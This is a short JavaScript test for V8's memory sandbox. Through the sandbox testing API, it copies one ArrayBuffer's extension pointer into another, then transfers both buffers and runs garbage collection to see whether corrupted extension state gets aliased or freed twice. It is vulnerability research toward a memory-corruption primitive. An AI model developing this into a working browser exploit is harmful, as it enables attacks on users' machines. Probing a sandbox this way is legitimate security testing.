// C21 H14: ArrayBuffer extension transplant alias + second transfer.
//
// H13 showed a.transfer() after transplanting b.extension into a produces a new
// buffer containing b's data. This checks whether transferred and b alias, and
// whether b.transfer() later consumes already-moved extension state.

const kHeapObjectTag = 1;
const kJSArrayBufferExtensionOffset = 0x2c;

const memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function getPtr(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}

function getField(obj, offset) {
  return memory.getUint32(obj + offset - kHeapObjectTag, true);
}

function setField(obj, offset, value) {
  memory.setUint32(obj + offset - kHeapObjectTag, value, true);
}

let a = new ArrayBuffer(16);
let b = new ArrayBuffer(16);
let va = new Uint8Array(a);
let vb = new Uint8Array(b);
va[0] = 0x11;
va[1] = 0x22;
vb[0] = 0x42;
vb[1] = 0x43;

let bExt = getField(getPtr(b), kJSArrayBufferExtensionOffset);
setField(getPtr(a), kJSArrayBufferExtensionOffset, bExt);

let transferred = a.transfer();
let vt = new Uint8Array(transferred);
print(`after_first_transfer=${transferred.byteLength}:${vt[0]}:${vt[1]}:${b.byteLength}:${vb[0]}:${vb[1]}`);

vt[1] = 0x99;
print(`alias_after_write=${vt[1]}:${vb[1]}`);

try {
  let b2 = b.transfer();
  let vb2 = new Uint8Array(b2);
  print(`b_second_transfer=${b.byteLength}:${b2.byteLength}:${vb2[0]}:${vb2[1]}`);
} catch (e) {
  print(`b_second_transfer_throw=${e.name}:${e.message}`);
}

gc();
print('post_gc_ok');
